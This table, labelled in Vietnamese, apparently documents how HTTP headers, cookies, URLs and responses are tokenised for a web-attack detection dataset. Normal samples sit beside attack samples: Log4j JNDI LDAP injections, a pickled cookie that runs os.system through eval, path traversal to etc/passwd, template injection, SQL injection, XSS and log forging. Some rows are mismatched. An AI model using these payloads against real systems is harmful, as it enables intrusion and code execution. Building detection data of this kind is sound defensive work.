# Untitled

| Headers | Loại payload | Dữ liệu mẫu | Output mẫu |
| --- | --- | --- | --- |
| **User-Agent** | bình thường | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
 | Mozilla
<VER_NUM>
Windows NT
<VER_NUM>
Win64
x64
AppleWebKit
<VER_NUM>
KHTML
like Gecko
Chrome
<VER_NUM>
Safari
<VER_NUM>
 |
| **Accept-Encoding** | bình thường  | deflate, gzip;q=1.0, *;q=0.2 | deflate
gzip
;q=
<QAL_VAL>
*
;q=
<QAL_VAL> |
| 

 | Log4j | deflate, gzip;q=1.0, *;q=0.2${jndi:ldapexample.com/payload.php} | deflate
gzip
;q=
<QAL_VAL>
*
;q=
<QAL_VAL>
${
jndi
:
ldap
<RAND_URL>
} |
| **Accept** | bình thường | text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 | text
html
application
xhtml+xml
application
xml
;q=
<QAL_VAL>
*
;q=
<QAL_VAL>
 |
|  |  |  |  |
|  | Log4j | deflate, gzip;q=1.0, *;q=0.2${jndi:ldapexample.com/example/payload.php/?message=test}

 | text
html
application
xhtml+xml
application
xml
;q=
<QAL_VAL>
*
;q=
<QAL_VAL>
${
jndi
:
ldap
<URL>
} |
| **Connection** | bình thường | keep-alive | keep-alive |
|  | Log4j | keep-alive${jndi:ldapexample.com/payload.php} | keep-alive
${
jndi
:
ldap
<URL>
} |
| **Accept-Language** | bình thường | en-US,en;q=0.2,he;q=1.0 | en-US
en
;q=
<QAL_VAL>
he
;q=
<QAL_VAL> |
|  | Log4j | en-US,en;q=0.2,he;q=1.0${jndi:ldapexample.com/payload.php} | en-US
en
;q=
<QAL_VAL>
he
;q=
<QAL_VAL>
${
jndi
:
ldap
<URL>
} |
| **Sec-Fetch-Site** | bình thường | none |  |
|  | Log4j | none${jndi:ldap://example.com/payload.php} | none
${
jndi
:
ldap
<URL>
}

 |
| **Sec-Fetch-Mode** | bình thường | navigate
same-origin |  |
|  | log4j | same-origin${jndi:ldapexample.com/payload.php} | same-origin
${
jndi
:
ldap
<URL>
}
 |
| **Sec-Fetch-Dest** | bình thường | document |  |
|  | Log4j | document${jndi:ldapexample.com/payload.php} | document
${
jndi
:
ldap
<URL>
} |
| **Sec-Fetch-User** | bình thường  | same-origin |  |
|  | Log4j | same-origin${jndi:ldapexample.com/payload.php} | same-origin
${
jndi
:
ldap
<URL>
} |
| **Set-Cookie** | bình thường | ['ck=w6oM9XV_jvWjuuVd3hLe3eSdXXPydbyfsLwTlj4Mc1NmI5eDx4S7d11hnDsjZVRLlgCvAA6t7ADJpOtU_CntfA; Domain=localhost:5000; Expires=Sun, 11 Dec 2022 03:12:09 GMT', 'uu=vrFDu19S_MO5YVsKsgsIQGiLxfi0atHX9GJf2xLlUCSjYxE0krh41ERJxK74jz-_6NoWRhAihX9YHXNaMcuyfA; Domain=localhost:5000; Expires=Sat, 26 Nov 2022 03:12:09 GMT', 'session=ae5ca83e-368b-4acb-a46d-9076594dd5a0; Expires=Fri, 11 Nov 2022 03:42:09 GMT']
 | [
ck
=
<B64_VAL>
Domain
=
<domain>
Expires
=
<time>
,
uu
=
<B64_VAL>
Domain
=
<domain>
Expires
=
<time>
,
session
=
<sessionID>
Expires
=
<time>
] |
|  | log4j | ['ck=nObNwD5O7QaEh6nk9sQhTJlrKrxfNhmx5X-Gdxv_PV-_VFKOnTPfC74YfMS8kbCtIpoTNfPRlGlT2jls-QaTyA; Domain=localhost:5000; Expires=Wed, 21 Dec 2022 18:12:16 GMT', 'uu=dolcoBfeDrnWPtErB309MFYzvmoM8SGO7wcD-6cbbOiChLtRdTPO9t1oSpNHgmvLbWSLbxkyE1pYhYmFGG9s5g; Domain=localhost:5000; Expires=Tue, 06 Dec 2022 18:12:16 GMT', 'session=af81452c-ba24-4a46-9b77-d1c46db10621; Expires=Mon, 21 Nov 2022 18:42:16 GMT']${jndi:ldapniefs.net/school.php} | [
ck
=
<B64_VAL>
Domain
=
<domain>
Expires
=
<time>
,
uu
=
<B64_VAL>
Domain
=
<domain>
Expires
=
<time>
,
session
=
<sessionID>
Expires
=
<time>
]
${
jndi
:
ldap
<RAND_URL>
} |
|  |  | ['ck=85BHR_urLN7hajpeFXdOMu9S0Jx9zY8gWbCigCrF_AA; Domain=http://www.tvn-fussball.de/index.php?option=com_joomleague&view=matchreport&p=15&mid=1172&Itemid=130; Expires=Sat, 04 Feb 2023 01:19:38 GMT', 'uu=xAe3osOfeMAB2JCcdmG92s7rrUXH60DS9ddE6ykeoH3IY_bUVW3NhCbmtOWKDGNJupSG0ez2zA9Ur5fKH8NULA; Domain=http://www.tarainstitute.org.au/spiritual-program/buddhist-practices/177-collect-merit-so-easily-at-the-center; Expires=Mon, 23 Jan 2023 01:19:38 GMT', 'session=1da2438c-7d87-49f3-99ae-cd1c801d8141; Expires=Sun, 18 Dec 2022 02:16:38 GMT']${jndi:ldapci.fullerton.ca.us/depts/engineering/traffic_engineering_n_signals/traffic_applications_permits.asp}
 | [
ck
=
<B64_VAL>
Domain
=
<domain>
Expires
=
<time>
,
uu
=
<B64_VAL>
Domain
=
<domain>
Expires
=
<time>
,
session
=
<sessionID>
Expires
=
<time>
]
${
jndi
:
ldap
<RAND_URL>
} |
| Cookie | bình thường | username=gASVygAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIyuKGV4ZWMoJycnCmltcG9ydCBvcwpvcy5zeXN0ZW0oInBvd2Vyc2hlbGwgZWNobyAnaGVsbG8gd29ybGQnIikKCmZyb20gY29sbGVjdGlvbnMgaW1wb3J0IG5hbWVkdHVwbGUKVXNlciA9IG5hbWVkdHVwbGUoJ1VzZXInLCBbJ3VzZXJuYW1lJ10pCicnJyksIFVzZXIodXNlcm5hbWU9J0NvbGxpZXInKSlbLTFdlIWUUpQu | username
=
builtins
eval
(
exec
('''
import

os
os
.
system
("
powershell

echo
'
hello

world
'")
from

collections

import

namedtuple
User
=
namedtuple
('
User
', ['
username
'])
'''),
User
(
username
='
Collier
'))[-
1
]
R
. |
|  | Cookie injection | username=gASVyQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIytKGV4ZWMoJycnCmltcG9ydCBvcwpvcy5zeXN0ZW0oInBvd2Vyc2hlbGwgZWNobyAnaGVsbG8gd29ybGQnIikKCmZyb20gY29sbGVjdGlvbnMgaW1wb3J0IG5hbWVkdHVwbGUKVXNlciA9IG5hbWVkdHVwbGUoJ1VzZXInLCBbJ3VzZXJuYW1lJ10pCicnJyksIFVzZXIodXNlcm5hbWU9J0NlZHJpYycpKVstMV2UhZRSlC4=; username=gASVKgAAAAAAAACMCF9fbWFpbl9flIwGUGVyc29ulJOUKYGUfZSMCHVzZXJuYW1llE5zYi4= | username
=
builtins
eval
(
exec
('''
import

os
os
.
system
("
powershell

echo
'
hello

world
'")
from

collections

import

namedtuple
User
=
namedtuple
('
User
', ['
username
'])
'''),
User
(
username
='
Cedric
'))[-
1
]
R
.
username
=
b'\x80\x04\x95'
*
b'\x00\x00\x00\x00\x00\x00\x00\x8c\x08'
**main**
Person
)
}
username
Nsb |
| Url | bình thường | [http://127.0.0.1:5000/categories/check/name/5391/](http://127.0.0.1:5000/post/new)
 | http
://
<ip>
:
5000
/
<RAND_DIR>
/
<RAND_DIR>
/
<RAND_DIR>
/
<RAND_DIR>
/ |
|  | Log Forging | [http://127.0.0.1:5000/orders/get/country?val=9306](http://127.0.0.1:5000/orders/check/exists?val=9306)
SUSPECTED: user Darin | http
://
<ip>
:
5000
/
<RAND_DIR>
/
<RAND_DIR>
/
<RAND_DIR>
?
<RAND_VAR>
=
<RAND_VAL>
b”\n”
SUSPECTED
:
user
Darin |
|  | Path traversal | [http://127.0.0.1:5000/html/categories/../../../../../../](http://127.0.0.1:5000/windows.ini.txt)etc/passwd | http
://
<ip>
:
5000
/
<RAND_DIR>
/
<RAND_DIR>
/
..
/
..
/
..
/
..
/
..
/
..
/
<random>
/
<random> |
|  | RCE | [http://127.0.0.1:5000/](http://127.0.0.1:5000/greet/)help/{{get_flashed_messages.globals.builtins.print('hello')}} | http
://
<ip>
:
5000
/
<RAND_DIR>
/
{{
get_flashed_messages
.
globals
.
builtins
.
print
(
'
hello
'
)
}} |
|  | sql injection | [http://127.0.0.1:5000/orders/get/country?country=](http://127.0.0.1:5000/orders/get/country?country=)';SELECT * FROM categories limit33-- | http
://
<ip>
:
5000
/
<RAND_DIR>
/
<RAND_DIR>
/
<RAND_DIR>
?
<RAND_VAR>
=
';
SELECT
*
FROM
categories
limit
<NUMBER>
— |
|  | XSS | [http://127.0.0.1:5000/forum?message=<%2Fp><script>alert()<%2Fscript><p>](http://127.0.0.1:5000/forum?message=%3C%2Fp%3E%3Cscript%3Ealert()%3C%2Fscript%3E%3Cp%3E) | http
://
<ip>
:
5000
/
<RAND_DIR>
?
<RAND_VAR>
=
</p>
<script>
alert
(
<RAND>
)
</script>
<p> |
|  |  |  |  |
|  |  |  |  |
| Response |  |  |  |
| status code |  | 200 | 200 |
| Content-Type |  | text/html; charset=utf-8 | text/html
charset
=
utf-8 |
| body  | json | {\"error\": \"Employee ID not found\"} | {
error
:
Employee
ID
not
found
} |
|  | json | {\"error\": \"File ../../../../windows.ini.txt not found\"} | {
error
:
File
../
../
../
../
<RAND_DIR>
not
found
} |
|  | html | <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n | <
html
lang
=
en
>
<
title
>
<RAND_STR>
</
title
>
<
h1
>
<RAND_STR>
</
h1
>
<
p
>
<RAND_STR>
</
p
> |
|  |  | <p>As always, you can find the resources and download links over at the Web Dev Resources List here:</p><p><a href=\"[https://www.appbrewery.co/p/web-development-course-resources\\](https://www.appbrewery.co/p/web-development-course-resources%5C%5C)" rel=\"noopener noreferrer\" target=\"_blank\">[https://www.appbrewery.co/p/web-development-course-resources](https://www.appbrewery.co/p/web-development-course-resources)</a></p> | <
p
>
<RAND_STR>
</
p
>
<
p
>
<
a
href
=
<RAND_URL>
rel
=
noopener
noreferrer
target
=
_blank
>
<RAND_STR>
</
a
>
</
p
> |